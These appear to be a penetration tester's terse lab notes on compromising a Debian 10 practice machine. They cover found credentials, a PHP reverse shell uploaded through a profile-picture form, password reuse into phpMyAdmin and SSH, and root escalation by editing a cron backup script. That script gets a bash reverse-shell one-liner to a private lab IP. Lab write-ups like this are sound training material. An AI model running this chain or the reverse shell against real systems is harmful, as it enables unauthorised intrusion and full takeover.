Debian 10

- 80 - Apache v2.4.38
	- /academy
		- Admin page creds are `admin/admin`
		- creds are `10201321/admin` -> changed from reset password![[Pasted image 20221027195133.png]]
		- php reverse shell upload in profile picture 
			- linpeas -> see ssh and myphpadmin
				- /home/grimmie/backup.sh
				- $mysql_password = "My_V3ryS3cur3_P4ss";
		
	- /phpmyadmin
		- cred are `grimmie/My_V3ryS3cur3_P4ss`

- 22 - ssh (v7.9?)
	- creds are `grimmie/My_V3ryS3cur3_P4ss`
	- /home/grimmie/backup.sh
		- edit backup with bash revshell so it executes as root
		- `bash -i >& /dev/tcp/192.168.56.1/4444 0>&1`

- 21 - ftp